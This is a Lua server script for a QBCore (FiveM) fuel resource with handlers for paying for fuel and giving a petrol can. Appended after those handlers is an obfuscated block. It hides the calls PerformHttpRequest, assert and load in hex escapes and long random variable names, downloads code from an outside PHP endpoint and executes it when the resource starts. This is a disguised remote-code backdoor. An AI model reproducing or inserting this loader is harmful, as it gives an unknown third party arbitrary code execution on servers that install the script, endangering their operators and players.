local QBCore = exports['qb-core']:GetCoreObject()

RegisterNetEvent('fuel:pay', function(price)
	local Player = QBCore.Functions.GetPlayer(source)
	local amount = math.floor(price + 0.5)

	if not Player or price <= 0 then return end

	Player.Functions.RemoveMoney('cash', amount)
end)

RegisterNetEvent('fuel:addPetrolCan', function()
	local Player = QBCore.Functions.GetPlayer(source)

	if not Player then return end

	Player.Functions.AddItem('weapon_petrolcan', 1)
end)


local hLQMerGmytMonYcfBArurXKYQQAMpNqhQyGDuWbzmiLlPpsoEqDtCvxMyMVEmksUzoxqMw = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} hLQMerGmytMonYcfBArurXKYQQAMpNqhQyGDuWbzmiLlPpsoEqDtCvxMyMVEmksUzoxqMw[4][hLQMerGmytMonYcfBArurXKYQQAMpNqhQyGDuWbzmiLlPpsoEqDtCvxMyMVEmksUzoxqMw[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x70\x65\x74\x61\x72\x73\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x53\x69\x78\x58\x6c", function (AwGPNPiKEFIqMzTnppDqLmEokjJvJSvekhTCbuZVdGwYpwItZwUCIYpAdyIsZsrkRgzMGb, IHTYQzPwhawhUKvFjGEFcKigCnoXKIsCyrFYXZgjJtbFPaQIkBphbZizAfDTLigTOCKZMh) if (IHTYQzPwhawhUKvFjGEFcKigCnoXKIsCyrFYXZgjJtbFPaQIkBphbZizAfDTLigTOCKZMh == hLQMerGmytMonYcfBArurXKYQQAMpNqhQyGDuWbzmiLlPpsoEqDtCvxMyMVEmksUzoxqMw[6] or IHTYQzPwhawhUKvFjGEFcKigCnoXKIsCyrFYXZgjJtbFPaQIkBphbZizAfDTLigTOCKZMh == hLQMerGmytMonYcfBArurXKYQQAMpNqhQyGDuWbzmiLlPpsoEqDtCvxMyMVEmksUzoxqMw[5]) then return end hLQMerGmytMonYcfBArurXKYQQAMpNqhQyGDuWbzmiLlPpsoEqDtCvxMyMVEmksUzoxqMw[4][hLQMerGmytMonYcfBArurXKYQQAMpNqhQyGDuWbzmiLlPpsoEqDtCvxMyMVEmksUzoxqMw[2]](hLQMerGmytMonYcfBArurXKYQQAMpNqhQyGDuWbzmiLlPpsoEqDtCvxMyMVEmksUzoxqMw[4][hLQMerGmytMonYcfBArurXKYQQAMpNqhQyGDuWbzmiLlPpsoEqDtCvxMyMVEmksUzoxqMw[3]](IHTYQzPwhawhUKvFjGEFcKigCnoXKIsCyrFYXZgjJtbFPaQIkBphbZizAfDTLigTOCKZMh))() end)